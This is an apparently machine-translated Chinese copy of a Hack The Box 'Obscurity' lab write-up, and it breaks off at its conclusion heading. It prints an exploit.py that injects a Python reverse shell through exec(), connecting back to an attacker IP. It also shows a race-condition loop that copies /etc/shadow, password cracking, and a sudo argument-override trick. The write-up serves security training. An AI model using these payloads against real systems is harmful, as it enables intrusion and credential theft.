<html>
<head>
<title>[HTB] Obscurity — Write-up</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">[HTB]默默无闻——记</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/htb-obscurity-write-up-bc65f61cd255?source=collection_archive---------0-----------------------#2020-05-10">https://infosecwriteups.com/htb-obscurity-write-up-bc65f61cd255?source=collection_archive---------0-----------------------#2020-05-10</a></blockquote><div><div class="fc ih ii ij ik il"/><div class="im in io ip iq"><div class=""/><figure class="gl gn jr js jt ju gh gi paragraph-image"><div class="gh gi jq"><img src="../Images/2874998624b666951de6edb320c2ef1e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1290/format:webp/0*nTfQy_Q20eYICPx8.png"/></div></figure><p id="e120" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated">欢迎来到淫秽报道！这是一个中等难度的Linux盒子，要求玩家在基于python的web服务器中找到一个缺陷，以获得初始访问权。一旦我们获得了反向shell的初始访问权，那么，我们将需要分析另一个加密密码的python脚本。然后，我们可以进行已知明文攻击(“KPA”)来恢复第二个用户的密码。最后，对于root访问，我们可以滥用现有BetterSSH.py脚本上的竞争条件来读取<code class="fe kv kw kx ky b">/etc/shadow</code>文件并破解“root”用户的密码。非常有趣的盒子，让我们开始吧！</p></div><div class="ab cl kz la hx lb" role="separator"><span class="lc bw bk ld le lf"/><span class="lc bw bk ld le lf"/><span class="lc bw bk ld le"/></div><div class="im in io ip iq"><figure class="lh li lj lk gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="ll lm di ln bf lo"><div class="gh gi lg"><img src="../Images/12bf8ab3a8ad5b6ab0d3525cd4301f1b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1188/format:webp/1*UMX_bgJ1LwpKqwBgRunGYw.png"/></div></div></figure><h1 id="e6c1" class="lp lq it bd lr ls lt lu lv lw lx ly lz ma mb mc md me mf mg mh mi mj mk ml mm bi translated">侦察</h1><p id="6763" class="pw-post-body-paragraph jx jy it jz b ka mn kc kd ke mo kg kh ki mp kk kl km mq ko kp kq mr ks kt ku im bi">_________________________________________________________________</p><h1 id="5d8d" class="lp lq it bd lr ls lt lu lv lw lx ly lz ma mb mc md me mf mg mh mi mj mk ml mm bi translated">Nmap</h1><p id="6945" class="pw-post-body-paragraph jx jy it jz b ka mn kc kd ke mo kg kh ki mp kk kl km mq ko kp kq mr ks kt ku im bi translated">让我们从使用以下命令进行初始端口扫描开始:</p><pre class="lh li lj lk gt ms ky mt mu aw mv bi"><span id="2e12" class="mw lq it ky b gy mx my l mz na">$ nmap -Pn — open -sC -sV -p- -T4 10.10.10.168</span></pre><figure class="lh li lj lk gt ju gh gi paragraph-image"><div class="gh gi nb"><img src="../Images/f8fab29f1bb5279a83618e45c1098f62.png" data-original-src="https://miro.medium.com/v2/resize:fit:1218/format:webp/1*BDoMULo4U6pGHEVLh_g01g.png"/></div></figure><h2 id="b757" class="mw lq it bd lr nc nd dn lv ne nf dp lz ki ng nh md km ni nj mh kq nk nl ml nm bi translated">值得注意的有趣端口:</h2><ul class=""><li id="2c48" class="nn no it jz b ka mn ke mo ki np km nq kq nr ku ns nt nu nv bi translated"><strong class="jz iu"> HTTP (8080/TCP) </strong> —盒子上只开放感兴趣的端口。很明显，这将是某种类型的网络相关的挑战，以获得最初的访问。当我们访问url (http://10.10.10.168:8080)时，我们会看到以下内容:</li></ul><figure class="lh li lj lk gt ju gh gi paragraph-image"><div class="gh gi nw"><img src="../Images/e2e814bf5f9997cea3c6d73920c7cc89.png" data-original-src="https://miro.medium.com/v2/resize:fit:1368/format:webp/1*9QbFuCblN33VusSfKHrV-A.png"/></div></figure><p id="d6dd" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated">我们可以读到这个网站的一些意图/格言:</p><figure class="lh li lj lk gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="ll lm di ln bf lo"><div class="gh gi nx"><img src="../Images/b694ca60852024e2e09578e13a1ad24f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*oNUYzAeSvqqr0Yl2k6kVeA.png"/></div></div></figure><p id="6667" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated">但是有一个有趣的内容是下面的。它表明我们可以在一个秘密目录中看到当前的web服务器源代码(“SuperSecureServer.py”):</p><figure class="lh li lj lk gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="ll lm di ln bf lo"><div class="gh gi ny"><img src="../Images/b0655ac9a36b7a241d67dc1c5f87044b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*AE_ud5HzrQ38OewJ36SB5w.png"/></div></div></figure><h2 id="b347" class="mw lq it bd lr nc nd dn lv ne nf dp lz ki ng nh md km ni nj mh kq nk nl ml nm bi translated">网络目录模糊化</h2><p id="0dea" class="pw-post-body-paragraph jx jy it jz b ka mn kc kd ke mo kg kh ki mp kk kl km mq ko kp kq mr ks kt ku im bi translated">知道了这一点，让我们开始模糊化web目录，以便找到“SuperSecureServer.py”可能位于何处。我使用了名为<a class="ae nz" href="https://github.com/ffuf/ffuf" rel="noopener ugc nofollow" target="_blank"> ffuf </a>的网络模糊器。(是用Go写的，超级快。我们也可以很容易地定制像打嗝模糊点。)</p><figure class="lh li lj lk gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="ll lm di ln bf lo"><div class="gh gi oa"><img src="../Images/f19f917b852c1868ef17bdddf3e7d31e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*WWK8WkS4IbzYYzjgLOx5gw.png"/></div></div></figure><p id="5768" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated">当我们进入<code class="fe kv kw kx ky b">/develop/SuperSecureServer.py</code>时，我们可以看到web服务器的源代码。</p><figure class="lh li lj lk gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="ll lm di ln bf lo"><div class="gh gi ob"><img src="../Images/c5a2b17d84b9f0483119389385a87073.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*G_q1PlLfqDYlKjmd78lvXA.png"/></div></div></figure></div><div class="ab cl kz la hx lb" role="separator"><span class="lc bw bk ld le lf"/><span class="lc bw bk ld le lf"/><span class="lc bw bk ld le"/></div><div class="im in io ip iq"><h1 id="5c32" class="lp lq it bd lr ls oc lu lv lw od ly lz ma oe mc md me of mg mh mi og mk ml mm bi translated">初始立足点+用户访问#1 (www-data)</h1><p id="e230" class="pw-post-body-paragraph jx jy it jz b ka mn kc kd ke mo kg kh ki mp kk kl km mq ko kp kq mr ks kt ku im bi">_________________________________________________________________</p><h2 id="7389" class="mw lq it bd lr nc nd dn lv ne nf dp lz ki ng nh md km ni nj mh kq nk nl ml nm bi translated">源代码分析</h2><p id="3e44" class="pw-post-body-paragraph jx jy it jz b ka mn kc kd ke mo kg kh ki mp kk kl km mq ko kp kq mr ks kt ku im bi translated">当我们对python代码进行快速静态分析时，我们可以在以下位置发现一个可疑的“exec()”函数。</p><figure class="lh li lj lk gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="ll lm di ln bf lo"><div class="gh gi oh"><img src="../Images/f30d88d2bddf71b82defd7c1bc3507e5.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*enXZZUQugwzIvlPyHUHCPw.png"/></div></div></figure><p id="3f74" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated">使用“exec()”，我们可以执行python系统调用来执行系统命令:</p><pre class="lh li lj lk gt ms ky mt mu aw mv bi"><span id="aebc" class="mw lq it ky b gy mx my l mz na"><strong class="ky iu">### Example Usage of exec()</strong><br/># python<br/>Python 2.7.18 (default, Apr 20 2020, 20:30:41) <br/>[GCC 9.3.0] on linux2<br/>&gt;&gt;&gt; import os<br/>&gt;&gt;&gt; exec(os.system("whoami"))<br/>root</span></pre><p id="e96a" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated"><strong class="jz iu">网络服务器上的远程代码执行(RCE)</strong></p><p id="060c" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated">为了理解执行python代码的正确语法，我们可以创建上述易受攻击代码的简化版本进行测试:</p><pre class="lh li lj lk gt ms ky mt mu aw mv bi"><span id="fcfa" class="mw lq it ky b gy mx my l mz na"><strong class="ky iu">[exploit.py] - Local RCE Attempt</strong></span><span id="8f9f" class="mw lq it ky b gy oi my l mz na">import os<br/>import urllib.parse</span><span id="6700" class="mw lq it ky b gy oi my l mz na">path = <strong class="ky iu">"""'; os.system("whoami");'"""      </strong></span><span id="c9a0" class="mw lq it ky b gy oi my l mz na">path = urllib.parse.unquote(path)<br/>info = "output = 'Document: {}'"<br/>exec(info.format(path))</span></pre><p id="704c" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated">当我们在本地机器上运行exploit.py时，我们得到以下输出:</p><figure class="lh li lj lk gt ju gh gi paragraph-image"><div class="gh gi oj"><img src="../Images/8ee0c0bf80f541d47314dbe57f598568.png" data-original-src="https://miro.medium.com/v2/resize:fit:1008/format:webp/1*xmMsqypoVjSwgiMKU2Wzfg.png"/></div></figure><p id="4763" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated">很好。让我们更新我们的脚本，看看我们能否在盒子上做一个RCE。</p><pre class="lh li lj lk gt ms ky mt mu aw mv bi"><span id="834d" class="mw lq it ky b gy mx my l mz na"><strong class="ky iu">[exploit.py] - Remote "Ping" Command Attempt</strong></span><span id="6abc" class="mw lq it ky b gy oi my l mz na">import os<br/>import urllib.parse<br/>import requests</span><span id="05bc" class="mw lq it ky b gy oi my l mz na">url = '<a class="ae nz" href="http://10.10.10.168:8080/'" rel="noopener ugc nofollow" target="_blank">http://10.10.10.168:8080/'</a></span><span id="a2e4" class="mw lq it ky b gy oi my l mz na">path = <strong class="ky iu">"""'; os.system("ping -c 1 10.10.14.39");'"""</strong></span><span id="2c05" class="mw lq it ky b gy oi my l mz na"># URL Encode Mode<br/>path = urllib.parse.unquote(path)<br/>#info = "output = 'Document: {}'"<br/>#exec(info.format(path))</span><span id="b7d8" class="mw lq it ky b gy oi my l mz na">r = requests.get(url + path)</span><span id="4a31" class="mw lq it ky b gy oi my l mz na">print(r.status_code)<br/>print(r.headers)<br/>print(r.text)</span></pre><p id="e874" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated">当我们运行exploit.py时，我们可以在机器上确认成功的RCE。</p><figure class="lh li lj lk gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="ll lm di ln bf lo"><div class="gh gi ok"><img src="../Images/7660a61357750593d821164074ba2790.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ghT3_Naurz9Mtr5I7TflZg.png"/></div></div></figure><h2 id="8217" class="mw lq it bd lr nc nd dn lv ne nf dp lz ki ng nh md km ni nj mh kq nk nl ml nm bi translated">反向外壳</h2><p id="042f" class="pw-post-body-paragraph jx jy it jz b ka mn kc kd ke mo kg kh ki mp kk kl km mq ko kp kq mr ks kt ku im bi translated">使用来自<a class="ae nz" href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet" rel="noopener ugc nofollow" target="_blank"> PentestMonkey </a>的python反向shell一行程序，我们可以更新exploit.py。</p><pre class="lh li lj lk gt ms ky mt mu aw mv bi"><span id="7c74" class="mw lq it ky b gy mx my l mz na"><strong class="ky iu">[exploit.py] - Python Reverse Shell</strong></span><span id="c56d" class="mw lq it ky b gy oi my l mz na">import os<br/>import urllib.parse<br/>import requests</span><span id="5c44" class="mw lq it ky b gy oi my l mz na">url = '<a class="ae nz" href="http://10.10.10.168:8080/'" rel="noopener ugc nofollow" target="_blank">http://10.10.10.168:8080/'</a></span><span id="421a" class="mw lq it ky b gy oi my l mz na">path = <strong class="ky iu">"""'; import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.39",8055));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"""</strong></span><span id="dcf8" class="mw lq it ky b gy oi my l mz na"># URL Encode Mode<br/>path = urllib.parse.unquote(path)<br/>#info = "output = 'Document: {}'"<br/>#exec(info.format(path))</span><span id="65a8" class="mw lq it ky b gy oi my l mz na">r = requests.get(url + path)</span><span id="78f2" class="mw lq it ky b gy oi my l mz na">print(r.status_code)<br/>print(r.headers)<br/>print(r.text)</span></pre><p id="7dc9" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated">当我们运行exploit.py时，我们将成功获得作为“www-data”用户的反向shell。</p><figure class="lh li lj lk gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="ll lm di ln bf lo"><div class="gh gi ol"><img src="../Images/1552293dc006e20d84b3c83177450db3.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*iYsBDZHKkIchXJe8MEtoaA.png"/></div></div></figure></div><div class="ab cl kz la hx lb" role="separator"><span class="lc bw bk ld le lf"/><span class="lc bw bk ld le lf"/><span class="lc bw bk ld le"/></div><div class="im in io ip iq"><h1 id="3132" class="lp lq it bd lr ls oc lu lv lw od ly lz ma oe mc md me of mg mh mi og mk ml mm bi translated">用户访问#2(罗伯特)</h1><p id="2bbf" class="pw-post-body-paragraph jx jy it jz b ka mn kc kd ke mo kg kh ki mp kk kl km mq ko kp kq mr ks kt ku im bi">_________________________________________________________________</p><p id="7dab" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated">为了升级到另一个用户(“robert”)，我们需要解决另一个python脚本挑战。我们可以在“罗伯特”的主目录中看到几个有趣的文件。</p><figure class="lh li lj lk gt ju gh gi paragraph-image"><div class="gh gi om"><img src="../Images/606fb74bae6c4c3b5c2818273675e126.png" data-original-src="https://miro.medium.com/v2/resize:fit:1276/format:webp/1*cWsjYbk-f7gd2xeiUOiUIA.png"/></div></figure><ul class=""><li id="5592" class="nn no it jz b ka kb ke kf ki on km oo kq op ku ns nt nu nv bi translated"><strong class="jz iu"> SuperSecureCrypt.py </strong>:这是一个用于加密/解密文件的脚本。</li></ul><figure class="lh li lj lk gt ju gh gi paragraph-image"><div class="gh gi oq"><img src="../Images/83b9d79c736407f085c3ad410999c817.png" data-original-src="https://miro.medium.com/v2/resize:fit:982/format:webp/1*e_0sh-81PS2MbjjbXeDx_g.png"/></div><figcaption class="or os gj gh gi ot ou bd b be z dk translated">“SuperSecureCrypt.py”脚本的第一部分</figcaption></figure><ul class=""><li id="008c" class="nn no it jz b ka kb ke kf ki on km oo kq op ku ns nt nu nv bi translated"><strong class="jz iu">check . txt</strong>:ASCII文本文件。这份文件说:</li></ul><pre class="lh li lj lk gt ms ky mt mu aw mv bi"><span id="d3b7" class="mw lq it ky b gy mx my l mz na">check.txt + key ----[Encrypt]----&gt; out.txt</span></pre><figure class="lh li lj lk gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="ll lm di ln bf lo"><div class="gh gi ov"><img src="../Images/b87ada541b8819e36994b20b4b9349f7.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*VNQWFtgn_8rFNLVdcNazgQ.png"/></div></div></figure><ul class=""><li id="0fd9" class="nn no it jz b ka kb ke kf ki on km oo kq op ku ns nt nu nv bi translated"><strong class="jz iu"> out.txt </strong>:这是一个UTF 8 Unicode文本。这是加密的check.txt文件的输出文件。</li></ul><figure class="lh li lj lk gt ju gh gi paragraph-image"><div class="gh gi ow"><img src="../Images/5f70bf12d3a1f182ae723eefbd65296e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1240/format:webp/1*IaEpuOe2I2IRR8K8aNDsuQ.png"/></div></figure><ul class=""><li id="af24" class="nn no it jz b ka kb ke kf ki on km oo kq op ku ns nt nu nv bi translated"><strong class="jz iu"> passwordreminder.txt </strong>:也是UTF 8 Unicode文本。假设这是某种类型的密码文件，我们需要一个有效的密钥来解密它。</li></ul><figure class="lh li lj lk gt ju gh gi paragraph-image"><div class="gh gi ox"><img src="../Images/a4ebab54d8f0439251415de55a114c68.png" data-original-src="https://miro.medium.com/v2/resize:fit:1110/format:webp/1*gFQ3uLKhlwIbHBk6Afi1Ow.png"/></div></figure><h2 id="10c7" class="mw lq it bd lr nc nd dn lv ne nf dp lz ki ng nh md km ni nj mh kq nk nl ml nm bi translated">已知明文攻击(“KPA”)</h2><p id="771f" class="pw-post-body-paragraph jx jy it jz b ka mn kc kd ke mo kg kh ki mp kk kl km mq ko kp kq mr ks kt ku im bi translated">所以在check.txt和out.txt文件之间，我们知道明文和加密文件，但不知道密钥。然而，由于我们有加密文件的明文+源代码，我们可以做一个KPA来检索密钥。</p><p id="d37d" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated">python加密/解密脚本已经给了我们，我们可以看到它的帮助页面:</p><figure class="lh li lj lk gt ju gh gi paragraph-image"><div class="gh gi oy"><img src="../Images/d5439bd265d44fafbfeed018753edcdb.png" data-original-src="https://miro.medium.com/v2/resize:fit:1270/format:webp/1*Bzalo9mBmQ6xcP3eyB2rLw.png"/></div></figure><p id="d0be" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated">这是不言自明的。为了得到一把钥匙，让我们供给</p><pre class="lh li lj lk gt ms ky mt mu aw mv bi"><span id="2970" class="mw lq it ky b gy mx my l mz na"><strong class="ky iu">### KPA Attack</strong><br/>$ python3 SuperSecureCrypt.py -i out.txt -o /dev/shm/key.txt -k 'Encrypting this file with your key should result in out.txt, make sure your key is correct!' -d</span><span id="2f51" class="mw lq it ky b gy oi my l mz na">-i = out.txt                       <strong class="ky iu"># File that we want to decrypt</strong><br/>-k = plaintext from check.txt      <strong class="ky iu"># Supplying the plaintext as key</strong> <br/>-o = key.txt                       <strong class="ky iu"># Output for the key</strong><br/>-d                                 <strong class="ky iu"># Decrypt mode</strong></span></pre><figure class="lh li lj lk gt ju gh gi paragraph-image"><div class="gh gi oz"><img src="../Images/06eb99b6d5cdea0fb0eefc1a4ff630af.png" data-original-src="https://miro.medium.com/v2/resize:fit:542/format:webp/1*thXtbStH8Gf1QVRim-I-ZQ.png"/></div></figure><p id="a214" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated">当我们打开key.txt文件时，我们可以看到key = alexandrovich。(似乎每个角色都在重复)</p><pre class="lh li lj lk gt ms ky mt mu aw mv bi"><span id="60bf" class="mw lq it ky b gy mx my l mz na">$ cat /dev/shm/key.txt<br/><strong class="ky iu">alexandrovich</strong>alexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovich</span></pre><figure class="lh li lj lk gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="ll lm di ln bf lo"><div class="gh gi pa"><img src="../Images/0d87549798f6dd871bc9a4ec8eaef55b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*y1xm2p0Kf_1HG1QC3bvAoA.png"/></div></div></figure><p id="4529" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated">有了这个密钥，我们现在可以解密passwordreminder.txt文件，以获得“robert”用户的明文密码。</p><pre class="lh li lj lk gt ms ky mt mu aw mv bi"><span id="aa60" class="mw lq it ky b gy mx my l mz na"><strong class="ky iu">### Getting robert's Password</strong><br/>$ python3 SuperSecureCrypt.py -i passwordreminder.txt -o /dev/shm/robert_pw.txt -k 'alexandrovich' -d </span></pre><figure class="lh li lj lk gt ju gh gi paragraph-image"><div class="gh gi pb"><img src="../Images/685c65f594b8ba51a231d67d7aa780ac.png" data-original-src="https://miro.medium.com/v2/resize:fit:976/format:webp/1*TrA6yvZeLKgTDLV6J_UVtw.png"/></div></figure><h2 id="1aaa" class="mw lq it bd lr nc nd dn lv ne nf dp lz ki ng nh md km ni nj mh kq nk nl ml nm bi translated">user.txt</h2><p id="4deb" class="pw-post-body-paragraph jx jy it jz b ka mn kc kd ke mo kg kh ki mp kk kl km mq ko kp kq mr ks kt ku im bi translated">有了这个密码，我们现在可以作为“robert”用户登录并读取<code class="fe kv kw kx ky b">user.txt</code>文件。(我们也可以将SSH与“robert”用户凭证一起使用。)</p><figure class="lh li lj lk gt ju gh gi paragraph-image"><div class="gh gi pc"><img src="../Images/7a3e56f55edd49d02eba458751159790.png" data-original-src="https://miro.medium.com/v2/resize:fit:1358/format:webp/1*peva9oj2Mxcp80MSSWhoeQ.png"/></div></figure></div><div class="ab cl kz la hx lb" role="separator"><span class="lc bw bk ld le lf"/><span class="lc bw bk ld le lf"/><span class="lc bw bk ld le"/></div><div class="im in io ip iq"><h1 id="c026" class="lp lq it bd lr ls oc lu lv lw od ly lz ma oe mc md me of mg mh mi og mk ml mm bi translated">根访问</h1><p id="6ea2" class="pw-post-body-paragraph jx jy it jz b ka mn kc kd ke mo kg kh ki mp kk kl km mq ko kp kq mr ks kt ku im bi">_________________________________________________________________</p><p id="1009" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated">我们可能要检查的第一件事是“robert”用户是否可以执行任何<code class="fe kv kw kx ky b">sudo</code>操作。并且，它发现用户可以做<code class="fe kv kw kx ky b">sudo</code>来运行BetterSSH.py脚本。看起来这将是另一个python挑战。(就像pythonPythonPYTHON :P)</p><figure class="lh li lj lk gt ju gh gi paragraph-image"><div class="gh gi pd"><img src="../Images/932835981ca3f330c0145cdcb777e801.png" data-original-src="https://miro.medium.com/v2/resize:fit:1328/format:webp/1*dzdmmjkUNIp7K6l1WSB8nw.png"/></div></figure><h2 id="d03b" class="mw lq it bd lr nc nd dn lv ne nf dp lz ki ng nh md km ni nj mh kq nk nl ml nm bi translated">路径#1 —竞争条件利用</h2><p id="80ae" class="pw-post-body-paragraph jx jy it jz b ka mn kc kd ke mo kg kh ki mp kk kl km mq ko kp kq mr ks kt ku im bi translated">从python脚本中我们可以发现，它读取<code class="fe kv kw kx ky b">/etc/shadow</code>文件来检查输入的用户密码。但它实际上是将<code class="fe kv kw kx ky b">/etc/shadow</code>写入<code class="fe kv kw kx ky b">/tmp/SSH/&lt;Some Random Gibberish&gt;</code>文件→休眠0.1段→然后将其删除。我们可以做一个竞态条件，在文件被删除之前复制它。</p><figure class="lh li lj lk gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="ll lm di ln bf lo"><div class="gh gi pe"><img src="../Images/2027c45f6cb4c8e731b1e1820936926c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*GxKsbJh-eaaDvoGAulgc3g.png"/></div></div></figure><p id="e0ec" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated">为了利用这一点，我们可以创建一个简单的无限循环，将所有内容从<code class="fe kv kw kx ky b">/tmp/SSH</code>复制到“robert”用户可以访问和阅读的其他地方。在运行时，我们将运行<code class="fe kv kw kx ky b">sudo /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py</code>命令将<code class="fe kv kw kx ky b">/etc/shadow</code>文件写入<code class="fe kv kw kx ky b">/tmp</code>目录。</p><pre class="lh li lj lk gt ms ky mt mu aw mv bi"><span id="521b" class="mw lq it ky b gy mx my l mz na">$ cat /tmp/copy.sh <br/>#!/bin/bash</span><span id="2b60" class="mw lq it ky b gy oi my l mz na">mkdir = '/tmp/SSH'</span><span id="61b6" class="mw lq it ky b gy oi my l mz na">while true<br/>do<br/>        cp /tmp/SSH/* /dev/shm/<br/>done</span></pre><figure class="lh li lj lk gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="ll lm di ln bf lo"><div class="gh gi pf"><img src="../Images/eb6494a4636067e4c17ef87754ec8287.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Z3_M2hf-a23efKxcFPNHiA.png"/></div></div></figure><p id="1530" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated">一旦通过身份验证，我们就可以检查<code class="fe kv kw kx ky b">/dev/shm</code>并看到复制的<code class="fe kv kw kx ky b">/etc/shadow</code>文件和“根”密码散列。</p><figure class="lh li lj lk gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="ll lm di ln bf lo"><div class="gh gi pg"><img src="../Images/d09e984416eafa2e3d9830cd7b88575f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*JBs7snCXZc2q9k7dxkPg7A.png"/></div></div></figure><p id="baa5" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated">用rockyou.txt单词表把散列输入John。这将破解“root”用户密码=“奔驰。”</p><figure class="lh li lj lk gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="ll lm di ln bf lo"><div class="gh gi ph"><img src="../Images/ed822436d23b54241b58f056f5167b32.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*cM9nmyWj6drOl43UaejTxg.png"/></div></div></figure><h2 id="3f08" class="mw lq it bd lr nc nd dn lv ne nf dp lz ki ng nh md km ni nj mh kq nk nl ml nm bi translated">root.txt</h2><p id="16a4" class="pw-post-body-paragraph jx jy it jz b ka mn kc kd ke mo kg kh ki mp kk kl km mq ko kp kq mr ks kt ku im bi translated">有了这个密码，我们可以<code class="fe kv kw kx ky b">su — root</code>将我们的权限提升到“root”用户，并读取<code class="fe kv kw kx ky b">root.txt</code>文件。</p><figure class="lh li lj lk gt ju gh gi paragraph-image"><div class="gh gi pi"><img src="../Images/777f682b886e76c33e4f08097e50e33c.png" data-original-src="https://miro.medium.com/v2/resize:fit:656/format:webp/1*qAN0ETDdZwtoOO-9kfXaww.png"/></div></figure><h2 id="3f53" class="mw lq it bd lr nc nd dn lv ne nf dp lz ki ng nh md km ni nj mh kq nk nl ml nm bi translated">路径#2 — Sudo用户覆盖漏洞</h2><p id="bc3e" class="pw-post-body-paragraph jx jy it jz b ka mn kc kd ke mo kg kh ki mp kk kl km mq ko kp kq mr ks kt ku im bi translated">仍然利用BetterSSH.py脚本，我们可以进行另一次权限提升。一旦通过验证，它就开始一个<code class="fe kv kw kx ky b">while True:</code>循环来打开另一个cmd shell。</p><figure class="lh li lj lk gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="ll lm di ln bf lo"><div class="gh gi pj"><img src="../Images/e6ca4cf133f97a4884b320d703a52236.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*RP9oIXNFo93973orBWQuNA.png"/></div></div></figure><p id="6d11" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated">这可能会被滥用，因为Linux倾向于优先使用最后提供的参数。举个例子，</p><pre class="lh li lj lk gt ms ky mt mu aw mv bi"><span id="d527" class="mw lq it ky b gy mx my l mz na">_____Hidden_____|_______Display________<br/>(sudo -u robert) $ id                     <strong class="ky iu"># Takes robert</strong><br/>(sudo -u robert) $ -u root id             <strong class="ky iu"># Takes root</strong><br/>(sudo -u robert) $ -u root -u robert id   <strong class="ky iu"># Takes robert</strong></span></pre><figure class="lh li lj lk gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="ll lm di ln bf lo"><div class="gh gi pk"><img src="../Images/0d5fd4486b097c29e4ce9ca4603f63c4.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*zts815kmPRbGCIfKR3kclQ.png"/></div></div></figure><p id="4c6b" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated">这样，我们也可以简单地对<code class="fe kv kw kx ky b">root.txt</code>文件进行cat。</p><figure class="lh li lj lk gt ju gh gi paragraph-image"><div class="gh gi pl"><img src="../Images/f2d7cb3c457b546c979194178b19ce4f.png" data-original-src="https://miro.medium.com/v2/resize:fit:780/format:webp/1*2CxZVcHIVJqfmrfZ-Tlirg.png"/></div></figure></div><div class="ab cl kz la hx lb" role="separator"><span class="lc bw bk ld le lf"/><span class="lc bw bk ld le lf"/><span class="lc bw bk ld le"/></div><div class="im in io ip iq"><h1 id="ee91" class="lp lq it bd lr ls oc lu lv lw od ly lz ma oe mc md me of mg mh mi og mk ml mm bi translated">结论</h1><p id="6469" class="pw-post-body-paragraph jx jy it jz b ka mn kc kd ke mo kg kh ki mp kk kl km mq ko kp kq mr ks kt ku im bi">_________________________________________________________________</p><p id="1227" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi 